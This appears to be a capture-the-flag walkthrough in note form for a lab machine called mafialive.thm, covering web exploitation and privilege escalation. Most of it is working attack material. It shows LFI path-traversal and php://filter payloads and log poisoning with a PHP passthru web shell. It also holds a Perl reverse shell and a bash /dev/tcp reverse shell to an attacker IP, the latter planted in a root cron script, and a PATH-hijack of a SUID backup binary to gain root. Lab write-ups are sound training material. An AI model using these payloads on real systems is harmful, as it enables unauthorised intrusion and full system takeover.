# Info

## IP = $IP

# Ports

## Port Scanning
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 22

## 80
- in email, It's possible to find domain name:
    - `mafialive.thm`
    - trade in _/etc/hosts_

### `mafialive.thm`
- first flag
- find in `robots.txt` or ...
- find, with manual test, the directory `http://mafialive.thm/test.php`

### `http://mafialive.thm/test.php`
- probable LFI
- yes: https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses
    - `view: /var/www/html/development_testing/..///////..////..//////..///////..////..//////etc/passwd`
- read `mrrobot.php` file
    - `view: php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
    - second flag
- log poisoning
```bash
┌──(kali㉿kali)-[~]
└─$ nc $IP 80               
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```
```bash
view: /var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
cmd: perl -e 'use Socket;$i="$ATK_IP";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

# PrivEsc

- in `/home/archange`, the third flag is in `user.txt`

## _linpeas.sh_

- /opt/helloworld.sh
    - write permissions
    - in _crontab_
    - `/bin/bash -i 5<> /dev/tcp/$ATK_IP/1337 0<&5 1>&5 2>&5`

## with **archangel** account
- /home/archangel/secret/backup
- read `strings` -> call the `cp` command
- it's possible to create a new `cp` command that will be executed in this file owned by root
```bash
$ pwd
pwd
/home/archangel/secret
$ echo "#!/bin/bash" > cp
echo "#!/bin/bash" > cp
$ echo "/bin/bash" >> cp
echo "/bin/bash" >> cp
$ chmod +x cp
chmod +x cp
$ export PATH=$PWD:$PATH
export PATH=$PWD:$PATH
$ echo $PATH
echo $PATH
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ./backup
./backup
root@ubuntu:~/secret# cd /root
cd /root
root@ubuntu:/root# cat root.txt
cat root.txt
```